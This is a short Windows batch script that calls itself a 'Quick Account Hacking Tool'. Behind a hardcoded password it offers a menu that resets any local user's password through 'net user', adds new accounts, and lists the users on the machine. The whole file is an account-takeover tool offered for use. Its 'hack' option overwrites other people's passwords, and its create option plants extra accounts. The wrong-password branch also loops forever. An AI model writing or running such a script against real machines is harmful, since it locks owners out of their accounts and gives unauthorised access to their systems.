@echo off
color 1a
title QAHT - Made by Ultra
set /a d=0
set /a cl=0
set /p p=Password:
if not %p%==ultra goto :wrongpassword
goto :menu

:wrongpassword
if %cl%==0 cls
set /a cl=1
echo You have input the wrong password!
goto :wrongpassword

:menu

title QAHT (Quick Account Hacking Tool) - Made by Ultra
cls
echo ___
echo QAHT (Quick Account Hacking Tool).
echo ___
echo e = exit QAHT
echo h = hack an account
echo c = create a new account
echo l = list the accounts of this computer network
if %d%==0 echo d = turn debug on, you will be able to see the used commands if its on
if %d%==0 echo (only recommended for advanced users/learning)
if %d%==1 echo debug mode is on
set /p o=:=
if %o%==d set /a d=1
if %o%==e exit
if %o%==h goto :hack
if %o%==l goto :list users
if %o%==c goto :create
goto :menu

:create
cls
echo Simply make a username and a password to create a windows account.
pause
cls
set /p u=New Username:
cls
set /p p=Password:
net user /add %u% %p%
cls
if %d%==1 echo - command: net user /add %u% %p%
if not %d%==1 cls 
echo An account with the following information should be added to this computer network now:
echo -
echo Username: %u%
echo Password: %p%
echo -
echo If the account has not been added, something went wrong and the
echo procedure did not work. This is most likely to be caused by
echo the fact that you might not have the needed privileges on your
echo current account.
echo ___
pause
cls 
goto :menu

:hack
cls
echo Type "list" to find the name of the account that you want to hack.
set /p u=Hack Username:
if %u%==list goto :list users
cls
set /p p=New Password:
cls
net user %u% %p% 
cls
if %d%==1 echo - command: net user %u% %p%
if not %d%==1 cls
echo An account with the following information should be hacked 
echo on this computer network now:
echo -
echo Username: %u%
echo Password: %p%
echo -
echo If the account has not been hacked, something went wrong and the
echo procedure did not work. This is most likely to be caused by
echo the fact that you might not have the needed privileges on your
echo current account.
echo ___
pause
cls 
goto :menu

:list users
cls
echo command: net user
net user
echo ___
pause
cls 
